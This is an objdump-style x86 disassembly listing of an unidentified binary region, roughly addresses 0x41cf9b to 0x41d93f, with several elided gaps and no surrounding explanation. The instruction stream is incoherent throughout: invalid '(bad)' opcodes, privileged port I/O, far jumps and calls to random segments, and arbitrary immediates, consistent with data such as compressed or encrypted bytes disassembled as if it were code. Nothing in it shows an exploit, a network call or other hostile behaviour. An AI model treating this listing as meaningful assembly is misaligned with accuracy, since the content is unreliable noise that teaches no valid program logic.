  41cf9b:	sar    BYTE PTR [ecx+edi*2],cl
  41cf9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf9f:	xor    cl,BYTE PTR [ebx+ebx*4]
  41cfa2:	jge    0x41cf5a
  41cfa4:	ja     0x41cfc2
  41cfa6:	aam    0xad
  41cfa8:	lods   al,BYTE PTR ds:[esi]
  41cfa9:	out    dx,eax
  41cfaa:	out    dx,al
  41cfab:	dec    ecx
  41cfac:	repz fidiv DWORD PTR [edx]
  41cfaf:	mov    al,ds:0x75cffa82
  41cfb4:	jmp    0x41cf3b
  41cfb6:	adc    cl,dl
  41cfb8:	sub    DWORD PTR [eax-0x30],0x1b2bfdc3
  41cfbf:	or     eax,0xb0bdbd4c
  41cfc4:	cwde   
  41cfc5:	arpl   WORD PTR [ebx],sp
  41cfc7:	scas   al,BYTE PTR es:[edi]
  41cfc8:	and    ah,BYTE PTR [edx+0x7e0b7c70]
  41cfce:	test   BYTE PTR [ecx+0x13],0xab
  41cfd2:	jo     0x41cf7e
  41cfd4:	aam    0x2e
  41cfd6:	push   ds
  41cfd7:	push   ecx
  41cfd8:	hlt    
  41cfd9:	int3   
  41cfda:	(bad)  
  41cfdb:	or     al,0xab
  41cfdd:	fcomp  QWORD PTR [edx+eiz*8]
  41cfe0:	mov    edx,0xfdcafb3c
  41cfe5:	retf   
  41cfe6:	fwait
  41cfe7:	sbb    BYTE PTR [ebx-0x19729c3],dh
  41cfed:	pop    edx
  41cfee:	jo     0x41d056
  41cff0:	test   BYTE PTR [ebx-0x4c],dh
  41cff3:	out    dx,al
  41cff4:	mov    bl,0xfe
  41cff6:	enter  0x16d,0x10
  41cffa:	adc    BYTE PTR [ecx],ah
  41cffc:	fs loope 0x41d06c
  41cfff:	pop    ss
  41d000:	or     eax,0xff15c967
  41d005:	pop    esp
  41d006:	aas    
  41d007:	jne    0x41cfe8
  41d009:	and    al,0xcc
  41d00b:	imul   esp,DWORD PTR [ecx],0xffffffe6
  41d00e:	cmp    eax,0x47a9d09
  41d013:	mov    eax,ds:0x31d16887
  41d018:	push   ecx
  41d019:	pop    esi
  41d01a:	ins    DWORD PTR es:[edi],dx
  41d01b:	push   esi
  41d01c:	or     DWORD PTR [ebx],0xe677ec25
  41d022:	inc    ebp
  41d023:	enter  0xd254,0xb2
  41d027:	sub    eax,0x4ae8defc
  41d02c:	push   ds
  41d02d:	mov    al,ds:0x103d8429
  41d032:	inc    esi
  41d033:	imul   ebp,DWORD PTR [ebp-0xe71308e],0x5c
  41d03a:	in     eax,dx
  41d03b:	adc    eax,0x26b6c332
  41d040:	jmp    0x41d014
  41d042:	jno    0x41d02f
  41d044:	dec    edx
  41d045:	mov    al,dh
  41d047:	inc    esi
  41d048:	shr    BYTE PTR [esi-0x2f94a636],1
  41d04e:	shr    BYTE PTR [esi],0x16
  41d051:	in     al,0x6d
  41d053:	inc    esp
  41d054:	(bad)  
  41d055:	lods   al,BYTE PTR ds:[esi]
  41d056:	cmp    dh,al
  41d058:	jl     0x41d043
  41d05a:	inc    ebx
  41d05b:	test   al,0x3e
  41d05e:	outs   dx,DWORD PTR fs:[esi]
  41d060:	push   0xec59e092
  41d065:	pop    edi
  41d066:	dec    eax
  41d067:	int3   
  41d068:	outs   dx,BYTE PTR ds:[esi]
  41d069:	jne    0x41d0c2
  41d06b:	xchg   DWORD PTR [ecx+0x3],edx
	...
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0xe550a5bd
  41d0e5:	shl    BYTE PTR [edi+0x38],cl
  41d0e8:	add    DWORD PTR [eax],eax
  41d0ea:	add    BYTE PTR [ecx],al
  41d0ec:	add    BYTE PTR [eax],al
  41d0ee:	adc    edx,DWORD PTR [edx-0x665dc11e]
  41d0f4:	pop    es
  41d0f5:	scas   al,BYTE PTR es:[edi]
  41d0f6:	xor    cl,al
  41d0f8:	fsubr  DWORD PTR [eax+0x47de1c40]
  41d0fe:	push   0x6a
  41d100:	ins    BYTE PTR es:[edi],dx
  41d101:	mov    edx,0x527ea8e9
  41d106:	imul   BYTE PTR [ebx]
  41d108:	out    dx,al
  41d109:	dec    eax
  41d10a:	call   FWORD PTR [eax]
  41d10c:	push   eax
  41d10d:	jne    0x41d0be
  41d10f:	inc    edi
  41d110:	fistp  DWORD PTR [ebx]
  41d112:	out    dx,al
  41d113:	stc    
  41d114:	cmp    ch,bl
  41d116:	call   0xf7b8eb74
  41d11b:	loope  0x41d142
  41d11d:	and    BYTE PTR [ebp-0x62],bh
  41d120:	mov    al,0x79
  41d122:	test   eax,0x55783ec5
  41d127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d128:	xlat   BYTE PTR ds:[ebx]
  41d129:	loop   0x41d12c
  41d12b:	push   esp
  41d12c:	inc    edi
  41d12d:	sbb    eax,edi
  41d12f:	dec    esi
  41d130:	mov    al,0x2d
  41d132:	push   edx
  41d133:	mov    ecx,0xe16403bd
  41d138:	xchg   esi,eax
  41d139:	inc    esp
  41d13a:	xchg   ebx,eax
  41d13b:	jle    0x41d18e
  41d13d:	cmovle esp,DWORD PTR [ecx]
  41d140:	mov    dl,0xe3
  41d142:	ins    BYTE PTR es:[edi],dx
  41d143:	mov    ds:0x98b17db6,eax
  41d148:	cmp    BYTE PTR es:[eax+0x16],0xe9
  41d14d:	arpl   WORD PTR [edi-0x38],dx
  41d150:	adc    eax,0x847b08ad
  41d155:	jp     0x41d1bb
  41d157:	test   BYTE PTR [ebp-0x5f08010a],cl
  41d15d:	test   DWORD PTR [edi-0x2e],ebp
  41d160:	or     ch,bl
  41d162:	mul    BYTE PTR [eax-0x3e]
  41d165:	sbb    BYTE PTR [ecx*1-0x6aeac34c],bl
  41d16c:	not    BYTE PTR [ecx+0x5]
  41d16f:	mov    ah,0x5
  41d171:	imul   edx,edx,0x521064f7
  41d177:	test   dl,0x8d
  41d17a:	fsub   st(2),st
  41d17c:	cmp    al,0x8
  41d17e:	pop    esp
  41d17f:	adc    BYTE PTR [ecx+0x7aa8e8a5],ch
  41d185:	adc    esi,DWORD PTR [ecx+0x3d091af7]
  41d18b:	call   0xe571:0x7999d2b7
  41d192:	sbb    ebp,esp
  41d194:	sbb    BYTE PTR ds:0xf36e3518,ch
  41d19a:	addr16 xchg esp,eax
  41d19c:	lods   eax,DWORD PTR ds:[esi]
  41d19d:	ret    
  41d19e:	inc    ecx
  41d19f:	pop    ds
  41d1a0:	(bad)  
  41d1a1:	dec    ecx
  41d1a2:	pop    ecx
  41d1a3:	test   DWORD PTR [edi],ecx
  41d1a5:	addr16 pop eax
  41d1a7:	xor    BYTE PTR [esi-0x1f4bf1ab],0x1f
  41d1ae:	nop
  41d1af:	or     eax,eax
  41d1b1:	inc    edi
  41d1b2:	sbb    bl,ah
  41d1b4:	fld    TBYTE PTR [esi+0x31]
  41d1b7:	cmp    dh,0x3a
  41d1ba:	les    eax,FWORD PTR [ebx+0x6909436b]
  41d1c0:	ss ret 
  41d1c2:	sbb    edx,DWORD PTR ds:0xba142c03
  41d1c8:	or     DWORD PTR [eax+eax*1-0x5a1379b7],0x99c1ed87
  41d1d3:	jbe    0x41d1da
  41d1d5:	rol    edx,1
  41d1d7:	lea    edx,[edx-0x34c98d16]
  41d1dd:	(bad)  
  41d1de:	pop    edx
  41d1df:	dec    edi
  41d1e0:	in     al,0xe1
  41d1e2:	xchg   cl,cl
  41d1e4:	aaa    
  41d1e5:	cmp    dl,dh
  41d1e7:	mov    bh,0xaa
  41d1e9:	mov    DWORD PTR [esi-0x3a],edx
  41d1ec:	out    dx,al
  41d1ed:	lock add BYTE PTR [eax],al
	...
  41d254:	add    BYTE PTR [eax],al
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	inc    edi
  41d263:	lahf   
  41d264:	sub    BYTE PTR [ecx],0x67
  41d267:	cmp    DWORD PTR [ecx],eax
  41d269:	add    BYTE PTR [eax],al
  41d26b:	add    DWORD PTR [eax],eax
  41d26d:	add    BYTE PTR [ebx],ch
  41d26f:	inc    edx
  41d270:	jnp    0x41d214
  41d272:	fld    DWORD PTR [esi]
  41d274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d275:	pop    ebx
  41d276:	les    edi,FWORD PTR [edi-0x7d]
  41d279:	and    DWORD PTR [ebp-0x1],esp
  41d27c:	mov    dh,0x50
  41d27e:	fcom   QWORD PTR [edi-0x7eb48db0]
  41d284:	scas   al,BYTE PTR es:[edi]
  41d285:	sub    BYTE PTR [eax+0x1a],bl
  41d288:	mov    ebx,0xaffaed6c
  41d28d:	loop   0x41d2b1
  41d28f:	push   ebx
  41d290:	xchg   ebp,eax
  41d291:	rol    BYTE PTR [ecx+0x4],cl
  41d294:	mov    bh,0x89
  41d296:	rcr    ch,1
  41d298:	int    0x4b
  41d29a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d29b:	jnp    0x41d2a8
  41d29d:	test   eax,0x82d4c14a
  41d2a2:	xchg   BYTE PTR [ebx+0x5f],ch
  41d2a5:	push   cs
  41d2a6:	scas   al,BYTE PTR es:[edi]
  41d2a7:	aaa    
  41d2a8:	dec    ecx
  41d2a9:	inc    esp
  41d2aa:	aad    0xf1
  41d2ac:	scas   ax,WORD PTR es:[edi]
  41d2ae:	fcom   QWORD PTR [ecx-0x5350bbf2]
  41d2b4:	inc    ebx
  41d2b5:	mov    dh,BYTE PTR [ebx-0x480dd40]
  41d2bb:	gs hlt 
  41d2bd:	test   cl,cl
  41d2bf:	push   ss
  41d2c0:	xchg   esp,ebp
  41d2c2:	xor    eax,0x43159aad
  41d2c7:	sub    BYTE PTR [edi],cl
  41d2c9:	arpl   ax,sp
  41d2cb:	ss pusha 
  41d2cd:	loop   0x41d2a0
  41d2cf:	xor    al,0x86
  41d2d1:	test   eax,0x342fd6fd
  41d2d6:	jg     0x41d2cd
  41d2d8:	(bad)  [ebp-0x5b]
  41d2db:	inc    ebp
  41d2dc:	pop    ebp
  41d2dd:	das    
  41d2de:	iret   
  41d2df:	jae    0x41d341
  41d2e1:	popf   
  41d2e2:	repz and DWORD PTR [eax-0xd],esp
  41d2e6:	outs   dx,DWORD PTR ds:[esi]
  41d2e7:	push   es
  41d2e8:	bound  edi,QWORD PTR [ebp+0x19]
  41d2eb:	lods   eax,DWORD PTR ds:[esi]
  41d2ec:	daa    
  41d2ed:	pop    es
  41d2ee:	loop   0x41d32d
  41d2f0:	xchg   esp,eax
  41d2f1:	push   ss
  41d2f2:	mov    esi,0xeef920ae
  41d2f7:	imul   esp,eax,0x59
  41d2fa:	repz fwait
  41d2fc:	stc    
  41d2fd:	jmp    0x41d303
  41d2ff:	(bad)  
  41d300:	xor    dl,dh
  41d302:	add    al,0x68
  41d304:	jae    0x41d302
  41d306:	xchg   ebx,eax
  41d307:	push   ecx
  41d308:	(bad)  
  41d309:	dec    ebp
  41d30a:	imul   edi,DWORD PTR [edi+eax*2],0x18
  41d30e:	jae    0x41d2a2
  41d310:	rcl    BYTE PTR [esp+eiz*8+0x58],0xee
  41d315:	gs pop esp
  41d317:	push   ds
  41d318:	xchg   BYTE PTR [edi+0x15],bh
  41d31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d31c:	push   esp
  41d31d:	scas   al,BYTE PTR es:[edi]
  41d31e:	pop    edi
  41d31f:	and    eax,0xbece2f3c
  41d324:	outs   dx,BYTE PTR ds:[esi]
  41d325:	test   ah,dl
  41d327:	jg     0x41d2df
  41d329:	fs cmp edi,eax
  41d32c:	jecxz  0x41d2ae
  41d32e:	lods   eax,DWORD PTR ds:[esi]
  41d32f:	pop    ebx
  41d330:	mov    ds:0xb6c89495,al
  41d335:	mov    esp,0xb3602c41
  41d33a:	cmp    ebx,eax
  41d33c:	add    ch,BYTE PTR [ebp+0x33]
  41d33f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d341:	sub    al,0x34
  41d343:	jge    0x41d374
  41d345:	in     eax,0xcd
  41d347:	enter  0xd44,0xdd
  41d34b:	lahf   
  41d34c:	or     al,0x54
  41d34e:	add    ah,BYTE PTR ds:0xb3675cf9
  41d354:	xor    cl,BYTE PTR [ecx+edi*2+0x68]
  41d358:	scas   al,BYTE PTR es:[edi]
  41d359:	in     eax,dx
  41d35a:	jle    0x41d3a7
  41d35c:	adc    bl,dl
  41d35e:	or     eax,0xd56c3c98
  41d363:	imul   edx,DWORD PTR [edi+0x56358717],0x47218461
  41d36d:	inc    ebp
	...
  41d3d6:	inc    BYTE PTR [eax+0x7dff54f9]
  41d3dc:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d3e2:	pop    di
  41d3e4:	aaa    
  41d3e5:	pop    ebp
  41d3e6:	cmp    al,BYTE PTR [bx+di]
  41d3e9:	add    BYTE PTR [eax],al
  41d3eb:	add    DWORD PTR [eax],eax
  41d3ed:	add    BYTE PTR [esi],dl
  41d3ef:	add    BYTE PTR [ebx+edx*1-0x7291b2c8],dl
  41d3f6:	pop    esi
  41d3f7:	je     0x41d465
  41d3f9:	out    0x1a,eax
  41d3fb:	inc    ebx
  41d3fc:	fcom   QWORD PTR [ebp+0x741c80c7]
  41d402:	jmp    FWORD PTR [esp+ebx*2]
  41d405:	pop    ecx
  41d406:	xchg   ecx,eax
  41d407:	bound  ebp,QWORD PTR [ecx+ebp*2-0xa]
  41d40b:	rol    DWORD PTR [esi],1
  41d40d:	mov    ecx,0x76abc722
  41d412:	jbe    0x41d412
  41d414:	xchg   ebx,eax
  41d415:	jmp    0xa7a02278
  41d41a:	std    
  41d41b:	fistp  WORD PTR [ecx]
  41d41d:	iret   
  41d41e:	adc    eax,0x6e80369c
  41d423:	mov    edi,0xea308b36
  41d428:	cs es dec eax
  41d42b:	ret    
  41d42c:	hlt    
  41d42d:	pop    esi
  41d42e:	sbb    dl,BYTE PTR [edi]
  41d430:	sbb    DWORD PTR [esi+0x6d],ebx
  41d433:	jl     0x41d442
  41d435:	mov    ch,0xe7
  41d437:	pop    esp
  41d438:	cs mov ebx,0x1cce5b9d
  41d43e:	push   ss
  41d43f:	test   DWORD PTR [edx+0x13],ebx
  41d442:	arpl   WORD PTR [ecx+ebx*2+0x50],bx
  41d446:	mov    al,0xa0
  41d448:	call   DWORD PTR [ebp+edx*2+0x48343507]
  41d44f:	daa    
  41d450:	sub    cl,BYTE PTR [edi]
  41d452:	lahf   
  41d453:	inc    DWORD PTR [edx]
  41d455:	cdq    
  41d456:	test   al,0xc7
  41d458:	sbb    bl,bl
  41d45a:	arpl   WORD PTR [edx],di
  41d45c:	int3   
  41d45d:	or     BYTE PTR [ecx+0x39],cl
  41d460:	ins    BYTE PTR es:[edi],dx
  41d461:	call   DWORD PTR [esi-0x77]
  41d464:	xchg   ebx,eax
  41d465:	adc    edx,DWORD PTR [ebp+0x67f8f37]
  41d46b:	in     al,0x8c
  41d46d:	(bad)  
  41d46e:	jmp    0x8b18893a
  41d473:	ins    BYTE PTR es:[edi],dx
  41d474:	(bad)  
  41d475:	jmp    0xea1e:0x5448e039
  41d47c:	and    BYTE PTR ds:0x7c895c60,cl
  41d482:	inc    edi
  41d483:	pop    es
  41d484:	push   ecx
  41d485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d486:	jge    0x41d46c
  41d488:	ficomp WORD PTR [ecx+0x57efdd53]
  41d48e:	pop    ecx
  41d48f:	dec    esp
  41d490:	xchg   edi,eax
  41d491:	shl    BYTE PTR [ebx-0x49f143f8],cl
  41d497:	jg     0x41d4b9
  41d499:	xor    eax,0x8fbe3fe4
  41d49e:	into   
  41d49f:	leave  
  41d4a0:	int3   
  41d4a1:	mov    ds:0x5800abad,al
  41d4a6:	inc    eax
  41d4a7:	js     0x41d43c
  41d4a9:	pop    ebx
  41d4aa:	dec    ebp
  41d4ab:	sub    al,0x7e
  41d4ad:	and    eax,0x8c0b8016
  41d4b2:	shl    eax,1
  41d4b4:	and    eax,0x15868e43
  41d4b9:	mov    dh,0xb2
  41d4bb:	clc    
  41d4bc:	mov    ebx,0x97511f19
  41d4c1:	mov    eax,0xfe76b6b8
  41d4c6:	test   al,0xcd
  41d4c8:	fadd   DWORD PTR [esp+edi*2]
  41d4cb:	aas    
  41d4cc:	sbb    al,0xd3
  41d4ce:	scas   eax,DWORD PTR es:[edi]
  41d4cf:	inc    ecx
  41d4d0:	or     DWORD PTR [edi],ebp
  41d4d2:	mov    WORD PTR [edi+0x4215030],ss
  41d4d8:	add    al,0x14
  41d4da:	addr16 sub al,0xe8
  41d4dd:	outs   dx,BYTE PTR ds:[esi]
  41d4de:	lock shl ebx,cl
  41d4e1:	lods   eax,DWORD PTR ds:[esi]
  41d4e2:	push   ebx
  41d4e3:	fnstcw WORD PTR [bx+di-0xf]
  41d4e7:	dec    ecx
  41d4e8:	xchg   esi,eax
  41d4e9:	popf   
  41d4ea:	push   edx
  41d4eb:	sbb    DWORD PTR [ecx+0x7e],edx
	...
  41d555:	add    dh,dh
  41d557:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x670c:0xe54d7d89
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [ebx],bl
  41d56f:	xor    esi,DWORD PTR [ecx+0x6c]
  41d572:	adc    eax,0x8b7bbf04
  41d577:	adc    al,0x7c
  41d579:	loop   0x41d55c
  41d57b:	sub    ch,dh
  41d57d:	mov    eax,DWORD PTR [eax-0x1d]
  41d580:	in     eax,0x49
  41d582:	mov    ds:0xc8b74dda,eax
  41d587:	sub    al,0x6e
  41d589:	cld    
  41d58a:	daa    
  41d58b:	sub    dl,BYTE PTR [ebx+0x3b036cf0]
  41d591:	push   eax
  41d592:	vpunpckhwd ymm7,ymm6,YMMWORD PTR [ebx]
  41d596:	jecxz  0x41d5b2
  41d598:	fisub  DWORD PTR [eax+ebp*1-0x30]
  41d59c:	sbb    esi,ebp
  41d59e:	add    al,dl
  41d5a0:	shl    BYTE PTR [ecx],cl
  41d5a2:	xor    dh,BYTE PTR [edx]
  41d5a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a5:	jmp    0x3a02e55e
  41d5aa:	(bad)  
  41d5ab:	cwde   
  41d5ac:	sbb    dh,BYTE PTR [ecx]
  41d5ae:	mov    ecx,0xef5d67d5
  41d5b3:	dec    esi
  41d5b4:	pop    esp
  41d5b5:	pop    esi
  41d5b6:	sbb    ah,BYTE PTR [edi-0x697e24b8]
  41d5bc:	fldl2e 
  41d5be:	sub    ebp,eax
  41d5c0:	and    edx,DWORD PTR [ecx+0x3174f02]
  41d5c6:	in     eax,dx
  41d5c7:	or     BYTE PTR [ebp-0x73],ch
  41d5ca:	inc    ecx
  41d5cb:	inc    ecx
  41d5cc:	loop   0x41d5d9
  41d5ce:	pushf  
  41d5cf:	push   ss
  41d5d0:	inc    edi
  41d5d1:	(bad)  
  41d5d2:	xor    eax,0xc2da18b3
  41d5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5d8:	enter  0x67f4,0x79
  41d5dc:	lock lea ebp,cs:[esi+0x4c2f0b95]
  41d5e4:	out    0x6f,al
  41d5e6:	mov    bh,0x40
  41d5e8:	or     dh,bh
  41d5ea:	sbb    al,0xf9
  41d5ec:	inc    ebx
  41d5ed:	push   cs
  41d5ee:	adc    esp,ecx
  41d5f0:	inc    edi
  41d5f1:	fwait
  41d5f2:	rcr    DWORD PTR [ebp-0x4cb101c3],0xeb
  41d5f9:	mov    ds:0x1c3192ab,eax
  41d5fe:	int    0xcf
  41d600:	stos   DWORD PTR es:[edi],eax
  41d601:	mov    eax,0x6523a130
  41d606:	pop    esp
  41d607:	clc    
  41d608:	into   
  41d609:	push   edx
  41d60a:	adc    ch,BYTE PTR [edx+0x5cff463c]
  41d610:	jg     0x41d66a
  41d612:	outs   dx,DWORD PTR ds:[esi]
  41d613:	and    edi,edi
  41d615:	loopne 0x41d5a2
  41d617:	test   eax,0xb723bb53
  41d61c:	test   BYTE PTR [edx-0x23],dl
  41d61f:	retf   0x72b5
  41d622:	push   edx
  41d623:	loopne 0x41d5d2
  41d625:	mov    ecx,0x646a562
  41d62a:	jb     0x41d5df
  41d62c:	jge    0x41d632
  41d62e:	cdq    
  41d62f:	imul   esp,DWORD PTR [edx+ecx*1+0x17],0xffffffdf
  41d634:	nop
  41d635:	es xchg esi,eax
  41d637:	and    eax,0x4f3cefb4
  41d63c:	xchg   ecx,eax
  41d63d:	adc    ebp,DWORD PTR [ebx]
  41d63f:	dec    edi
  41d640:	jnp    0x41d5e2
  41d642:	sbb    al,0xa7
  41d644:	mov    esi,0xbcd8c3f0
  41d649:	ret    
  41d64a:	pop    ebx
  41d64b:	jbe    0x41d5d8
  41d64d:	or     BYTE PTR [edi+edi*8+0x488d888c],al
  41d654:	dec    eax
  41d655:	enter  0x5c52,0x41
  41d659:	(bad)  
  41d65a:	or     esp,DWORD PTR [eax]
  41d65c:	mov    ebp,0xce53d541
  41d661:	xlat   BYTE PTR ds:[ebx]
  41d662:	pop    ss
  41d663:	scas   eax,DWORD PTR es:[edi]
  41d664:	ror    DWORD PTR [ecx],0xd6
  41d667:	pop    esp
  41d668:	xchg   ebp,eax
  41d669:	cmp    esp,DWORD PTR [edx+eiz*8+0x9305]
	...
  41d6d4:	add    BYTE PTR [eax],al
  41d6d6:	jl     0x41d671
  41d6d8:	dec    esp
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x7b66e435
  41d6e3:	jle    0x41d6f4
  41d6e5:	xchg   esi,eax
  41d6e6:	addr16 cmp al,0x1
  41d6e9:	add    BYTE PTR [eax],al
  41d6eb:	add    DWORD PTR [eax],eax
  41d6ed:	add    BYTE PTR [ecx-0x7a],dh
  41d6f0:	push   esp
  41d6f1:	inc    esp
  41d6f2:	call   DWORD PTR [ebx-0x1a]
  41d6f5:	inc    edx
  41d6f6:	mov    esp,0xd422ce62
  41d6fb:	push   esi
  41d6fc:	mov    dl,0xcd
  41d6fe:	sub    ebp,eax
  41d700:	lods   al,BYTE PTR ds:[esi]
  41d701:	xor    eax,0x89f0afee
  41d706:	int3   
  41d707:	div    dh
  41d709:	sti    
  41d70a:	in     eax,0xf
  41d70c:	jmp    0x4c7:0x979fcdb2
  41d713:	and    eax,0x35d08b55
  41d718:	nop
  41d719:	pop    esi
  41d71a:	pop    esi
  41d71b:	ror    DWORD PTR [eax+0x590e34a5],cl
  41d721:	push   ebp
  41d722:	and    BYTE PTR [ecx-0x276fd819],bl
  41d728:	int3   
  41d729:	dec    esp
  41d72a:	mov    dl,0x45
  41d72c:	ficom  WORD PTR [ebx+0x4d0929de]
  41d732:	cmp    BYTE PTR [ecx-0x758bfe1b],bl
  41d738:	int    0x98
  41d73a:	js     0x41d73e
  41d73c:	(bad)  
  41d73d:	cmp    eax,0x8f2de641
  41d742:	dec    eax
  41d743:	sbb    dh,BYTE PTR [ebp+ecx*1-0x443b5aa1]
  41d74a:	push   es
  41d74b:	pop    ss
  41d74c:	add    edi,ebx
  41d74e:	imul   edi,esi,0x75
  41d751:	aad    0xeb
  41d753:	sub    BYTE PTR [edi-0x2c40507f],ch
  41d759:	or     ebp,ebx
  41d75b:	call   0xa711c26
  41d760:	scas   eax,DWORD PTR es:[edi]
  41d761:	jp     0x41d73d
  41d763:	sub    eax,0xb4de580e
  41d768:	dec    esi
  41d769:	sub    al,0xcf
  41d76b:	jmp    0x41d774
  41d76d:	jp     0x41d7bc
  41d76f:	add    ch,ch
  41d771:	mov    eax,ds:0x95d0ad99
  41d776:	mov    dh,0x27
  41d778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d779:	push   0x6abdf428
  41d77e:	dec    ebp
  41d77f:	rcr    DWORD PTR [ebx+0x105e0956],cl
  41d785:	mov    al,0x8a
  41d787:	imul   ebx,DWORD PTR [edx+ecx*2-0x10],0x6f
  41d78c:	mov    esi,0x3035a867
  41d791:	jmp    0x828a:0xb6e35438
  41d798:	mov    esi,DWORD PTR [edx+0x320c014b]
  41d79e:	push   esi
  41d79f:	loope  0x41d776
  41d7a1:	mov    cl,0x9f
  41d7a3:	aam    0xb5
  41d7a5:	arpl   WORD PTR [ebp+0x5e],cx
  41d7a8:	mov    al,ds:0x3cb72aa7
  41d7ad:	pop    ebx
  41d7ae:	adc    bl,0xf9
  41d7b1:	fcmovnbe st,st(5)
  41d7b3:	fs dec esp
  41d7b5:	fucomi st,st(1)
  41d7b7:	add    eax,0xb06d535d
  41d7bc:	mov    eax,ds:0x38c77b17
  41d7c1:	pop    ss
  41d7c2:	and    edx,DWORD PTR [ecx-0x63]
  41d7c5:	dec    esi
  41d7c6:	mov    ch,0x91
  41d7c8:	lods   eax,DWORD PTR ds:[esi]
  41d7c9:	add    eax,0x45835c53
  41d7ce:	jecxz  0x41d824
  41d7d0:	jne    0x41d7fa
  41d7d2:	dec    eax
  41d7d3:	cmp    eax,0x72c0cfd7
  41d7d8:	ins    BYTE PTR es:[edi],dx
  41d7d9:	mov    al,0x61
  41d7db:	and    al,0x4
  41d7dd:	adc    BYTE PTR [esi-0x529bb5],cl
  41d7e3:	ret    0x8bd4
  41d7e6:	push   ss
  41d7e7:	daa    
  41d7e8:	aam    0x3b
  41d7ea:	sbb    ch,BYTE PTR [ecx+0xffb1]
	...
  41d854:	add    BYTE PTR [eax],al
  41d856:	and    al,0xce
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	adc    bl,0x7b
  41d865:	add    DWORD PTR [edi+0x3d],esp
  41d868:	add    DWORD PTR [eax],eax
  41d86a:	add    BYTE PTR [ecx],al
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	xchg   edi,eax
  41d86f:	cmp    DWORD PTR [ebx-0x7],ebx
  41d872:	mov    cl,0xef
  41d874:	pop    esp
  41d875:	jb     0x41d888
  41d877:	mov    ds:0x52d60cc6,al
  41d87c:	enter  0x63e3,0xe5
  41d880:	xor    DWORD PTR [ebx],0x82e62cd3
  41d886:	ja     0x41d84a
  41d888:	shr    dl,cl
  41d88a:	ror    edx,cl
  41d88c:	je     0x41d88b
  41d88e:	dec    ebx
  41d88f:	mov    es,edi
  41d891:	inc    esp
  41d892:	pop    es
  41d893:	out    0x81,al
  41d895:	add    ah,BYTE PTR [eax+0x2f]
  41d898:	aam    0x71
  41d89a:	stos   DWORD PTR es:[edi],eax
  41d89b:	test   DWORD PTR [ebp+0x31be5e35],edx
  41d8a1:	ror    DWORD PTR [edx],0x82
  41d8a4:	cmp    BYTE PTR [edi-0x5b],bh
  41d8a7:	stos   BYTE PTR es:[edi],al
  41d8a8:	mov    ebx,0xf5e9dab
  41d8ad:	ror    bl,1
  41d8af:	mov    ds:0x9f989363,eax
  41d8b4:	aam    0x7f
  41d8b6:	je     0x41d88e
  41d8b8:	scas   al,BYTE PTR es:[edi]
  41d8b9:	sbb    ebx,DWORD PTR ds:0x95913370
  41d8bf:	enter  0x16f9,0x3f
  41d8c3:	(bad)  
  41d8c4:	sti    
  41d8c5:	inc    ebp
  41d8c6:	sub    edx,DWORD PTR [edi]
  41d8c8:	fs loopne 0x41d8d3
  41d8cb:	xchg   edx,eax
  41d8cc:	xor    DWORD PTR [ebp+0x38],esi
  41d8cf:	mov    ah,0xa8
  41d8d1:	push   ebx
  41d8d2:	and    DWORD PTR [ecx],eax
  41d8d4:	aas    
  41d8d5:	mov    bl,0x48
  41d8d7:	ins    BYTE PTR es:[edi],dx
  41d8d8:	(bad)  
  41d8d9:	sbb    eax,0xfdc1c418
  41d8de:	sub    DWORD PTR [ebx],esp
  41d8e0:	or     eax,0xe6971e67
  41d8e5:	mov    dh,0x6f
  41d8e7:	and    BYTE PTR [ebp+0x6d2ccf74],0xaa
  41d8ee:	loop   0x41d941
  41d8f0:	sbb    eax,edi
  41d8f2:	sti    
  41d8f3:	and    esp,DWORD PTR [edi+0x4aa8e95d]
  41d8f9:	inc    eax
  41d8fa:	mov    ebp,eax
  41d8fc:	and    al,BYTE PTR [ecx]
  41d8fe:	xor    al,0xef
  41d900:	sub    BYTE PTR [edx+edi*2-0x3d],0xa0
  41d905:	pop    ebp
  41d906:	inc    eax
  41d907:	adc    DWORD PTR [edi+0x36c62410],esi
  41d90d:	popa   
  41d90e:	nop
  41d90f:	fst    QWORD PTR [edi+0x7b]
  41d912:	jo     0x41d8b0
  41d914:	pop    edi
  41d915:	icebp  
  41d916:	xchg   edx,eax
  41d917:	mov    eax,0x50586bb6
  41d91c:	imul   esi,ebx,0xffffffb8
  41d91f:	jg     0x41d93c
  41d921:	lds    ebx,FWORD PTR [ecx+ebx*1]
  41d924:	mov    eax,0x16b24c99
  41d929:	mov    edx,DWORD PTR ds:0x3cbbe44b
  41d92f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d930:	out    dx,eax
  41d931:	sbb    BYTE PTR [ebp-0x35],ch
  41d934:	jg     0x41d8f5
  41d936:	lahf   
  41d937:	in     eax,0x55
  41d939:	and    al,0xd8
  41d93b:	(bad)  
  41d93c:	rcl    BYTE PTR [edi-0x18],1
  41d93f:	fild   QWORD PTR ds:0xe2ab3bbc
